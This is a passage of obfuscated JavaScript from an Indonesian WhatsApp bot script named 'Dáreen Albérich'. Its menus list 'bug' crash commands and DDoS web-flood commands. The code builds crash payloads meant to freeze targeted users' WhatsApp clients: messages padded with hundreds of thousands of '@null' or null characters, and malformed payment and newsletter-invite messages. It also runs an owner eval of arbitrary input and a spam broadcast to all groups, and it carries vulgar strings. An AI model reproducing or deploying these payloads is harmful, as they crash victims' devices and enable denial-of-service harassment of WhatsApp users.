              containsAutoReply: true,
              showAdAttribution: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example"
            },
            entryPointConversionSource: "entry_point_source_example",
            entryPointConversionApp: "entry_point_app_example",
            entryPointConversionDelaySeconds: 5,
            disappearingMode: {},
            actionLink: {
              url: "‎ ‎ "
            },
            groupSubject: " X ",
            parentGroupJid: "6287888888888-1234567890@g.us",
            trustBannerType: " X ",
            trustBannerAction: 1,
            isSampled: false,
            utm: {
              utmSource: " X ",
              utmCampaign: " X "
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "6287888888888-1234567890@g.us",
              serverMessageId: 1,
              newsletterName: " X ",
              contentType: "UPDATE",
              accessibilityText: " X "
            },
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            smbClientCampaignId: "smb_client_campaign_id_example",
            smbServerCampaignId: "smb_server_campaign_id_example",
            dataSharingContext: {
              showMmDisclosure: true
            }
          }
        }
      }, _0x282469 ? {
        participant: {
          jid: _0x521ebd
        }
      } : {});
      console.log(chalk2.red("𝐈𝐌 ransmooodtzy"));
    }
    ;
    _0x221ba4.sendButtonVideo = async (_0x1ef7bd, _0xe40f4b, _0x1a158f, _0x3c0162 = {}) => {
      const _0x4456a4 = {
        url: _0x3c0162 && _0x3c0162.video ? _0x3c0162.video : ""
      };
      const _0x1ebb59 = {
        video: _0x4456a4
      };
      const _0x286d34 = {
        upload: _0x221ba4.waUploadToServer
      };
      var _0x45b95f = await prepareWAMessageMedia(_0x1ebb59, _0x286d34);
      const _0x398c23 = {
        text: _0x3c0162 && _0x3c0162.body ? _0x3c0162.body : ""
      };
      const _0x1e0cc0 = {
        text: _0x3c0162 && _0x3c0162.footer ? _0x3c0162.footer : ""
      };
      const _0x456e9f = {
        hasMediaAttachment: true,
        videoMessage: _0x45b95f.videoMessage
      };
      const _0x565b9e = {
        buttons: _0xe40f4b,
        messageParamsJson: ""
      };
      const _0x3d1e4b = {
        quoted: _0x1a158f
      };
      let _0x24a2c0 = generateWAMessageFromContent(_0x1ef7bd, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: _0x398c23,
              footer: _0x1e0cc0,
              header: _0x456e9f,
              nativeFlowMessage: _0x565b9e,
              contextInfo: {
                externalAdReply: {
                  title: global.namabot,
                  body: "𝐙𝐞𝐧𝐨 𝐍𝐞𝐰 𝐄𝐫𝐚",
                  thumbnailUrl: global.imageurl,
                  sourceUrl: global.isLink,
                  mediaType: 1,
                  renderLargerThumbnail: true
                }
              }
            }
          }
        }
      }, _0x3d1e4b);
      await _0x221ba4.sendPresenceUpdate("composing", _0x1ef7bd);
      return _0x221ba4.relayMessage(_0x1ef7bd, _0x24a2c0.message, {
        messageId: _0x24a2c0.key.id
      });
    };
    async function _0x3ae0e1(_0x29c727, _0x5220b5, _0x310a16, _0x138829, _0x252e31, _0x5cedc5, _0x23c831, _0x120719) {
      const _0x2da511 = {
        filterName: _0x5220b5,
        parameters: _0x310a16,
        filterResult: _0x138829,
        clientNotSupportedConfig: _0x252e31
      };
      const _0x28326f = {
        clauseType: _0x5cedc5,
        clauses: _0x23c831,
        filters: _0x120719
      };
      const _0x380012 = {
        filter: _0x2da511,
        filterClause: _0x28326f
      };
      const _0x381306 = {
        qp: _0x380012
      };
      var _0x4eee62 = generateWAMessageFromContent(_0x29c727, proto.Message.fromObject(_0x381306), {
        userJid: _0x29c727
      });
      await _0x221ba4.relayMessage(_0x29c727, _0x4eee62.message, {
        participant: {
          jid: _0x29c727
        },
        messageId: _0x4eee62.key.id
      });
    }
    async function _0x37ae83(_0x52fafa, _0x5e12a1, _0x380d7f, _0x4cc111, _0x59ca7b, _0xd4c3c3, _0x495671, _0x15ad24, _0x64e6f7, _0x5def8e, _0x4e30b6, _0x3c18de, _0xad0404, _0x1268c3) {
      const _0x2393ff = {
        sessionVersion: _0x5e12a1,
        localIdentityPublic: _0x380d7f,
        remoteIdentityPublic: _0x4cc111,
        rootKey: _0x59ca7b,
        previousCounter: _0xd4c3c3,
        senderChain: _0x495671,
        receiverChains: _0x15ad24,
        pendingKeyExchange: _0x64e6f7,
        pendingPreKey: _0x5def8e,
        remoteRegistrationId: _0x4e30b6,
        localRegistrationId: _0x3c18de,
        needsRefresh: _0xad0404,
        aliceBaseKey: _0x1268c3
      };
      const _0x73a634 = {
        sessionStructure: _0x2393ff
      };
      var _0x54815d = generateWAMessageFromContent(_0x52fafa, proto.Message.fromObject(_0x73a634), {
        userJid: _0x52fafa
      });
      await _0x221ba4.relayMessage(_0x52fafa, _0x54815d.message, {
        participant: {
          jid: _0x52fafa
        },
        messageId: _0x54815d.key.id
      });
    }
    async function _0x2a7e44(_0x5e9bac, _0x9fe98a) {
      let _0x4920f2 = await generateWAMessageFromContent(_0x5e9bac, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: "kontol"
              },
              header: {
                hasMediaAttachment: false,
                locationMessage: {}
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }]
              }
            }
          }
        }
      }), {
        userJid: _0x5e9bac,
        quoted: _0x9fe98a
      });
    }
    const _0x49a4ac = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net"
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "@null".repeat(500000) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    };
    async function _0x33be3b(_0x351929, _0x176454, _0x2acc6b) {
      let _0x4fd42a = await generateWAMessageFromContent(_0x351929, proto.Message.fromObject({
        ephemeralMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "Sent",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ModsExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@Akmal.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(_0x2acc6b) + "\",\"screen_0_TextInput_1\":\"⃢Dáreen Albérich𓆰⸸𓆪🚀⃤\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
                version: 3
              }
            }
          }
        }
      }), {
        userJid: _0x351929,
        quoted: _0x176454
      });
    }
    async function _0x5e1483(_0x48e46d) {
      var _0x2b8415 = generateWAMessageFromContent(_0x48e46d, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                hasMediaAttachment: true,
                sequenceNumber: "0",
                jpegThumbnail: ""
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "review_and_pay",
                  buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":k" + _0x25cbac + ",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
                }],
                messageParamsJson: "\0".repeat(10000)
              }
            }
          }
        }
      }), {});
      _0x221ba4.relayMessage(_0x48e46d, _0x2b8415.message, {
        messageId: _0x2b8415.key.id
      });
    }
    async function _0x397ab4(_0x4c55dc) {
      var _0x129d42 = generateWAMessageFromContent(_0x4c55dc, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            newsletterAdminInviteMessage: {
              newsletterJid: "120363298524333143@newsletter",
              newsletterName: "𝐓𝐇𝐄 𝐊𝐈𝐍𝐆 Dáreen Albérich𓆰⸸𓆪" + "\0".repeat(920000),
              jpegThumbnail: "",
              caption: "Undangan Admin Bokep",
              inviteExpiration: Date.now() + 1814400000
            }
          }
        }
      }), {
        userJid: _0x4c55dc
      });
      await _0x221ba4.relayMessage(_0x4c55dc, _0x129d42.message, {
        participant: {
          jid: _0x4c55dc
        },
        messageId: _0x129d42.key.id
      });
    }
    const _0x1fb1cd = {
      participant: "0@s.whatsapp.net",
      ...(_0x4611fa.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x519fd3 = {
      key: _0x1fb1cd,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs3.readFileSync("./dareen/zkosong.png")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️⃢Dáreen Albérich𓆰⸸𓆪🚀⃤\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const _0x39547d = {
      participant: "0@s.whatsapp.net",
      ...(_0x4611fa.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x4ab2ad = {
      key: _0x39547d,
      message: {
        listResponseMessage: {
          title: "⃢Dáreen Albérich𓆰⸸𓆪🚀⃤"
        }
      }
    };
    const _0x1ebad2 = _0x4ab2ad;
    const _0x5c6e77 = {
      participant: "0@s.whatsapp.net",
      ...(_0x4611fa.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x4511b8 = {
      key: _0x5c6e77,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: fs3.readFileSync("./dareen/zkosong.png")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️⃢Dáreen Albérich𓆰⸸𓆪🚀⃤\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    let _0x455732 = [];
    for (let _0x5794c1 of _0x37e54b) {
      _0x455732.push({
        displayName: await _0x221ba4.getName(_0x5794c1 + "@s.whatsapp.net"),
        vcard: "BEGIN:VCARD\n\nVERSION:3.0\n\nN:" + (await _0x221ba4.getName(_0x5794c1 + "@s.whatsapp.net")) + "\n\nFN:Dáreen Albérich𓆰⸸𓆪\n\nitem1.TEL;waid=" + _0x5794c1 + ":" + _0x5794c1 + "\n\nitem1.X-ABLabel:Ponsel\n\nitem2.EMAIL;type=INTERNET:Dáreen Albérich𓆰⸸𓆪s@gmail.com\n\nitem2.X-ABLabel:Email\n\nitem3.URL:bit.ly/Dáreen Albérich𓆰⸸𓆪\n\nitem3.X-ABLabel:YouTube\n\nitem4.ADR:;;Dáreen Albérich𓆰⸸𓆪 Official;;;;\n\nitem4.X-ABLabel:Session 1\n\nEND:VCARD"
      });
    }
    if (_0x194cac && _0x4611fa.msg.fileSha256 && _0x4611fa.msg.fileSha256.toString("base64") in global.db.data.sticker) {
      let _0x9f9264 = global.db.data.sticker[_0x4611fa.msg.fileSha256.toString("base64")];
      let {
        text: _0x565e2e,
        mentionedJid: _0x3b0a2c
      } = _0x9f9264;
      const _0x455841 = {
        text: _0x565e2e,
        mentions: _0x3b0a2c
      };
      const _0x2b5a9d = {
        userJid: _0x221ba4.user.id,
        quoted: _0x4611fa.quoted && _0x4611fa.quoted.fakeObj
      };
      let _0x44bc85 = await generateWAMessage(_0x1dd769, _0x455841, _0x2b5a9d);
      _0x44bc85.key.fromMe = areJidsSameUser(_0x4611fa.sender, _0x221ba4.user.id);
      _0x44bc85.key.id = _0x4611fa.key.id;
      _0x44bc85.pushName = _0x4611fa.pushName;
      if (_0x4611fa.isGroup) {
        _0x44bc85.participant = _0x4611fa.sender;
      }
      let _0xb7cb8 = {
        ..._0x19d7a3,
        messages: [proto.WebMessageInfo.fromObject(_0x44bc85)],
        type: "append"
      };
      _0x221ba4.ev.emit("messages.upsert", _0xb7cb8);
    }
    if (_0x24e006.startsWith("!")) {
      try {
        return _0x1d3510(JSON.stringify(eval("" + _0x18d0e5.join(" ")), null, "\t"));
      } catch (_0x24a2bb) {
        _0x1d3510(_0x24a2bb);
      }
    }
    if (_0x2eafe1) {
      if (_0x24e006.match("chat.whatsapp.com")) {
        _0x4611fa.reply("*「 ANTI LINK 」*\n\nLink grup detected, maaf kamu akan di kick !");
        if (!_0x3c8260) {
          return _0x4611fa.reply("Upsss... gajadi, bot bukan admin");
        }
        let _0x50ec0f = "https://chat.whatsapp.com/" + (await _0x221ba4.groupInviteCode(_0x4611fa.chat));
        let _0x32a047 = new RegExp(_0x50ec0f, "i");
        let _0x2f24ff = _0x32a047.test(_0x4611fa.text);
        if (_0x2f24ff) {
          return _0x4611fa.reply("Upsss... gak jadi, untung link gc sendiri");
        }
        if (_0x13697b) {
          return _0x4611fa.reply("Upsss... gak jadi, kasian adminnya klo di kick");
        }
        if (_0x1220c9) {
          return _0x4611fa.reply("Upsss... gak jadi, kasian owner ku klo di kick");
        }
        if (_0x4611fa.key.fromMe) {
          return _0x4611fa.reply("Upsss... gak jadi, kasian owner ku klo di kick");
        }
        await _0x221ba4.sendMessage(_0x4611fa.chat, {
          delete: {
            remoteJid: _0x4611fa.chat,
            fromMe: false,
            id: _0x4611fa.key.id,
            participant: _0x4611fa.key.participant
          }
        });
        _0x221ba4.groupParticipantsUpdate(_0x4611fa.chat, [_0x4611fa.sender], "remove");
      }
    }
    if (_0x2ede3c) {
      if (_0x24e006.match("chat.whatsapp.com")) {
        if (!_0x3c8260) {
          return;
        }
        let _0x11fe4a = "https://chat.whatsapp.com/" + (await _0x221ba4.groupInviteCode(_0x4611fa.chat));
        let _0x5e044c = new RegExp(_0x11fe4a, "i");
        let _0x3ba784 = _0x5e044c.test(_0x4611fa.text);
        if (_0x3ba784) {
          return;
        }
        if (_0x13697b) {
          return;
        }
        if (_0x2db258) {
          return;
        }
        if (_0x4611fa.key.fromMe) {
          return;
        }
        await _0x221ba4.sendMessage(_0x4611fa.chat, {
          delete: {
            remoteJid: _0x4611fa.chat,
            fromMe: false,
            id: _0x4611fa.key.id,
            participant: _0x4611fa.key.participant
          }
        });
      }
    }
    if (_0x5325f0) {
      if (_0x24e006.match("chat.whatsapp.com")) {
        _0x4611fa.reply(autojpmm + "\n");
        let _0x4ec01d = "https://chat.whatsapp.com/";
        let _0xcf4eda = new RegExp(_0x4ec01d, "i");
        let _0x2eaceb = _0xcf4eda.test(_0x4611fa.text);
        await _0x221ba4.sendMessage(_0x4611fa.chat, {
          delete: {
            remoteJid: _0x4611fa.chat,
            fromMe: false,
            id: _0x4611fa.key.id,
            participant: _0x4611fa.key.participant
          }
        });
      }
    }
    switch (_0x53d4d1) {
      case "fearless":
        {
          await _0x221ba4.sendMessage(_0x4611fa.chat, {
            react: {
              text: "🖤",
              key: _0x4611fa.key
            }
          });
          await _0x221ba4.sendMessage(_0x4611fa.chat, {
            react: {
              text: "👑",
              key: _0x4611fa.key
            }
          });
          wek = "\n〘 `Dáreen Albérich𓆰⸸𓆪 𝗚𝗘𝗡 𝟭𝟯 ` 〙\n𝐓𝐠𝐥 𝐏𝐞𝐦𝐛𝐮𝐚𝐭𝐚𝐧 : 25 ɴᴏᴠ 2024\n𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : Dáreen Albérich𓆰⸸𓆪 ɢᴇɴ 13\n𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : " + global.namaowner + "\n︽︾︽︾︽︾︽︾︽︾︽︾︽︾︽︾︽\n`[ 𝐃𝐎𝐖𝐍𝐋𝐎𝐃𝐄𝐑 ]`\n◈ /ytmp4 ↯ *<link>*\n◈ /ytmp3 ↯ *<link>*\n◈ /dtiktok ↯ *<link>*\n◈ /mediafire ↯ *<link>*\n◈ /playmp4 ↯ *<link>*\n◈ /playmp3 ↯ *<link>*\n◈ /spotify ↯ *<link>*\n`[ 𝐂𝐎𝐍𝐕𝐄𝐑𝐓𝐄𝐑 ]`\n◈ /owner\n◈ /qc\n◈ /sticker\n◈ /telegraph\n◈ /toimg\n◈ /remini\n◈ /hd\n◈ /pinterest\n◈ /emojimix\n︽︾︽︾︽︾︽︾︽︾︽︾︽︾︽︾︽\nsʜᴏᴡ ᴍᴇɴᴜ ᴀᴛᴛᴀᴄᴋɪɴɢ? 🥶\n⚠️ ᴘʟᴇᴀsᴇ  ᴛʏᴘᴇ .dareen\n";
          const _0x4fea23 = {
            video: zanss,
            gifPlayback: true,
            caption: wek,
            contextInfo: {
              externalAdReply: {
                title: "Dáreen Albérich𓆰⸸𓆪",
                body: "@Dáreen Albérich𓆰⸸𓆪sdeveloper ",
                thumbnailUrl: "https://files.catbox.moe/m6wbpq.jpg",
                sourceUrl: "https://whatsapp.com/channel/0029VaZjmLq2v1IyjGKp6P0U",
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
          };
          _0x221ba4.sendMessage(_0x4611fa.chat, _0x4fea23, {
            quoted: _0x4611fa
          });
        }
        await sleep(1500);
        const _0x5557a0 = {
          audio: _0x475bb6,
          mimetype: "audio/mp4",
          ptt: true
        };
        await _0x221ba4.sendMessage(_0x4611fa.chat, _0x5557a0, {
          quoted: _0x4611fa
        });
        break;
      case "dareen":
        {
          await _0x221ba4.sendMessage(_0x4611fa.chat, {
            react: {
              text: "🖤",
              key: _0x4611fa.key
            }
          });
          await _0x221ba4.sendMessage(_0x4611fa.chat, {
            react: {
              text: "👑",
              key: _0x4611fa.key
            }
          });
          wek = "〘 `Dáreen Albérich𓆰⸸𓆪 𝗚𝗘𝗡 𝟭𝟯 ` 〙\n𝐓𝐠𝐥 𝐏𝐞𝐦𝐛𝐮𝐚𝐭𝐚𝐧 : 25 ɴᴏᴠ 2024\n𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : Dáreen Albérich𓆰⸸𓆪 ɢᴇɴ 13 \n𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : " + global.namaowner + "\n︽︾︽︾︽︾︽︾︽︾︽︾︽︾︽︾︽\n`[ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 𝐁𝐎𝐓𝐙 ]`\n◈ †hambadareen ↯ *<62xxxx>*\n◈ †hapushamba ↯ *<62xxxx>*\n◈ †alamdareen ↯ *<in group>*\n◈ †hapusalam ↯ *<in group>*\n`[ 𝐁𝐔𝐆 𝐕𝟏𝟑 𝐌𝐄𝐍𝐔 ]`\n◈ †hus ↯ *<62xxx>*\n◈ †enyahlah ↯ *<62xxx>*\n◈ †cuih ↯ *<62xxx>*\n◈ †damn ↯ *<62xxx>*\n◈ †fuck ↯ *<62xxx>*\n◈ †alberich ↯ *<62xxx>*\n◈ †imdareen ↯ *<in place>*\n◈ †dor ↯ *<in place>*\n`[ 𝐃𝐃𝐎𝐒 𝐖𝐄𝐁 𝐌𝐄𝐍𝐔 ]`\n◈ /dos ↯ *[Url] [Time] [Thread] [Rate]*\n◈ /ddos ↯ *[Url] [Time] [Thread] [Rate]*\n◈ /floads ↯ *[Url] [Time] [Thread] [Rate]*\n◈ /ua ↯ *[Url] [Time] [Thread] [Rate]*\n◈ /xchrome ↯ *[Url] [Time] [Thread] [Rate]*\n◈ /tls ↯ *[Url] [Time] [Thread] [Rate]*\n◈ /tlsv2 ↯ *[Url] [Time] [Thread] [Rate]*\n◈ /tlsbypass ↯ *[Url] [Time] [Thread] [Rate]*\n◈ /tls-vip ↯ *[Url] [Time] [Thread] [Rate]*\n◈ /xc ↯ *[Url] [Time] [Thread] [Rate]*\n︽︾︽︾︽︾︽︾︽︾︽︾︽︾︽︾︽\n⚠️ 𝐍𝐎𝐓𝐄 ⚠️ : ᴅɪʟᴀʀᴀɴɢ ᴍᴇɴʏᴇʙᴀʀᴋᴀɴ sᴄʀɪᴘᴛ ɪɴɪ sᴇᴄᴀʀᴀ ᴄᴜᴍᴀ - ᴄᴜᴍᴀ, ᴊɪᴋᴀ sᴀᴍᴘᴀɪ ᴋᴇᴛᴀʜᴜᴀɴ ᴏʟᴇʜ ᴅᴇᴠ (Dáreen Albérich𓆰⸸𓆪) ɴᴀɴᴛɪ ʙᴇʀᴀᴋ ɴʏᴀ ᴋᴇʀᴀs\n";
          const _0x102c40 = {
            video: zanss,
            gifPlayback: true,
            caption: wek,
            contextInfo: {
              externalAdReply: {
                title: "Dáreen Albérich𓆰⸸𓆪",
                body: "@Dáreen Albérich𓆰⸸𓆪sdeveloper ",
                thumbnailUrl: "https://files.catbox.moe/m6wbpq.jpg",
                sourceUrl: "https://whatsapp.com/channel/0029VaZjmLq2v1IyjGKp6P0U",
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
          };
          _0x221ba4.sendMessage(_0x4611fa.chat, _0x102c40, {
            quoted: _0x4611fa
          });
        }
        await sleep(1500);
        const _0x35edf3 = {
          audio: _0x475bb6,
          mimetype: "audio/mp4",
          ptt: true
        };
        await _0x221ba4.sendMessage(_0x4611fa.chat, _0x35edf3, {
          quoted: _0x4611fa
        });
        break;
      case "mediafire":
        {
          if (!_0x1220c9) {
            return _0x1d3510("Ngapain ? Fitur Ini Buat BANG Dáreen Albérich𓆰⸸𓆪,");
          }
          if (_0x18d0e5.length == 0) {
            return _0x1d3510("Link Nya Tuan?");
          }
          if (!isUrl(_0x18d0e5[0]) && !_0x18d0e5[0].includes("mediafire.com")) {
            return _0x1d3510("The link you provided is invalid");
          }
          const {
            mediafireDl: _0x2dba9d
          } = require("./database/mediafire.js");
          const _0x2426d9 = await _0x2dba9d(_0x3e94bb);
          if (_0x2426d9[0].size.split("MB")[0] >= 100) {
            return _0x1d3510("Oops, the file is too big...");
          }
          const _0x59f53c = "*MEDIAFIRE DOWNLOADER*\n\n*❖ Name* : " + _0x2426d9[0].nama + "\n*❖ Size* : " + _0x2426d9[0].size + "\n*❖ Mime* : " + _0x2426d9[0].mime + "\n*❖ Link* : " + _0x2426d9[0].link;
          _0x1d3510("" + _0x59f53c);
          const _0x2dfc9b = {
            url: _0x2426d9[0].link
          };
          const _0x234d9a = {
            document: _0x2dfc9b,
            fileName: _0x2426d9[0].nama,
            mimetype: _0x2426d9[0].mime
          };
          _0x221ba4.sendMessage(_0x4611fa.chat, _0x234d9a, {
            quoted: _0x4611fa
          });
        }
        break;
      case "jpmfoto":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.only.owner);
          }
          if (!_0x3e94bb) {
            return _0x1d3510("*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n" + (_0x137417 + _0x53d4d1) + " teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik");
          }
          let _0x19a112 = await _0x221ba4.groupFetchAllParticipating();
          let _0x2e9d7e = Object.entries(_0x19a112).slice(0).map(_0x3cfc52 => _0x3cfc52[1]);
          let _0x1855b8 = _0x2e9d7e.map(_0x231681 => _0x231681.id);
          for (let _0x5f0703 of _0x1855b8) {
            if (/image/.test(_0x27f568)) {
              media = await _0x221ba4.downloadAndSaveMediaMessage(_0x3af358);
              mem = await uptotelegra(media);
              const _0x5a6410 = {
                url: mem
              };
              await _0x221ba4.sendMessage(_0x5f0703, {
                image: _0x5a6410,
                caption: _0x3e94bb.split("|")[0]
              });
              await sleep(_0x3e94bb.split("|")[1]);
            } else {
              await _0x221ba4.sendMessage(_0x5f0703, {
                text: _0x3e94bb.split("|")[0]
              });
              await sleep(_0x3e94bb.split("|")[1]);
            }
          }
          _0x1d3510("Sukses Mengirim Broadcast Ke " + _0x1855b8.length + " Group");
        }
        break;
      case "playmp4":
        {
          if (!_0x428d53 && !_0x1220c9) {
            return _0x1d3510("lu siapa?");
          }
          if (!q) {
            return _0x1d3510("Enter the Song Title!");
          }
          _0x1d3510("Tunggu Kak sedang Dáreen Albérich𓆰⸸𓆪 Proses");
          let _0x314ab8 = await ytPlayMp4(q);
          const _0x83326 = {
            url: _0x314ab8.url[0]
          };
          const _0x517fd9 = {
            quoted: _0x4611fa
          };
          _0x221ba4.sendMessage(_0x1dd769, {
            video: _0x83326,
            caption: "Youtube Play Video\n\nTitle: " + _0x314ab8.title + "\nChannel: " + _0x314ab8.channel + "\nViews: " + _0x314ab8.views
          }, _0x517fd9);
        }
        break;
      case "playmp3":
        {
          if (!_0x428d53 && !_0x1220c9) {
            return _0x1d3510("lu siapa?");
          }
          if (!q) {
            return _0x1d3510("Enter the Song Title!");
          }
          _0x1d3510("Tunggu Kak sedang Dáreen Albérich𓆰⸸𓆪 Proses");
          let _0x4d9e6a = await ytPlayMp3(q);
          const _0x399ec6 = {
            url: _0x4d9e6a.url[0]
          };
          const _0x2b9346 = {
            audio: _0x399ec6,
            mimetype: "audio/mp4",
            ptt: false
          };
          const _0x574169 = {
            quoted: _0x4611fa
          };
          _0x221ba4.sendMessage(_0x1dd769, _0x2b9346, _0x574169);
        }
        break;
      case "ytmp4":
        {
          if (!_0x428d53 && !_0x1220c9) {
            return _0x1d3510("lu siapa?");
          }
          if (!q) {
            return _0x1d3510("Link Not Found !");
          }
          _0x1d3510("Tunggu Kak sedang Dáreen Albérich𓆰⸸𓆪 Proses");
          let _0x16bd84 = await ytDonlodMp4(q);
          const _0x11e780 = {
            url: _0x16bd84.url[0]
          };
          const _0x430907 = {
            quoted: _0x4611fa
          };
          _0x221ba4.sendMessage(_0x1dd769, {
            video: _0x11e780,
            caption: "Youtube Download Video\n\nJudul: " + _0x16bd84.title + "\nChannel: " + _0x16bd84.channel + "\nUpload: " + _0x16bd84.published + "\nViews: " + _0x16bd84.views
          }, _0x430907);
        }
        break;
      case "ytmp3":
        {
          if (!_0x428d53 && !_0x1220c9) {
            return _0x1d3510("lu siapa?");
          }
          if (!q) {
            return _0x1d3510("Link Not Found !");
          }
          _0x1d3510("Tunggu Kak sedang Dáreen Albérich𓆰⸸𓆪 Proses");
          let _0x95ee18 = await ytDonlodMp3(q);
          const _0x2fa38 = {
            url: _0x95ee18.url[0]
          };
          const _0x2da1e5 = {
            audio: _0x2fa38,
            mimetype: "audio/mp4",
            ptt: false
          };
          const _0x5b3b3f = {
            quoted: _0x4611fa
          };
          _0x221ba4.sendMessage(_0x1dd769, _0x2da1e5, _0x5b3b3f);
        }
        break;
      case "dtiktok":
        {
          if (!_0x1220c9) {
            return _0x4611fa.reply("*khusus Premium*");
          }
          if (!_0x3e94bb) {
            return _0x4611fa.reply("Example : " + (_0x137417 + _0x53d4d1) + " link");
          }
          if (!q.includes("tiktok")) {
            return _0x4611fa.reply("Link Invalid!!");
          }
          await _0x1d3510(mess.wait);
          require("./database/tiktok").Tiktok(q).then(_0x55203f => {
            const _0x3465a7 = {
              url: _0x55203f.nowm
            };
            const _0x82987a = {
              video: _0x3465a7
            };
            _0x221ba4.sendMessage(_0x4611fa.chat, _0x82987a, {
              quoted: _0x4611fa
            });
          });
        }
        break;
      case "joingc":
        {
          if (!_0x1220c9) {
            return _0x1d3510(mess.only.owner);
          }
          if (!q) {
            return _0x1d3510("Kirim perintah " + (_0x137417 + _0x53d4d1) + " *_Link Grup Nya Tuan?🤔_*");
          }
          var _0x49c8ba = q.split("https://chat.whatsapp.com/")[1];
          var _0x4923a = await _0x221ba4.groupAcceptInvite(_0x49c8ba);
          _0x4611fa.reply("*Sukses Join Ke Grup Tuan✅*");
        }
        break;
      case "spotify":
        {
          if (!_0x3e94bb) {
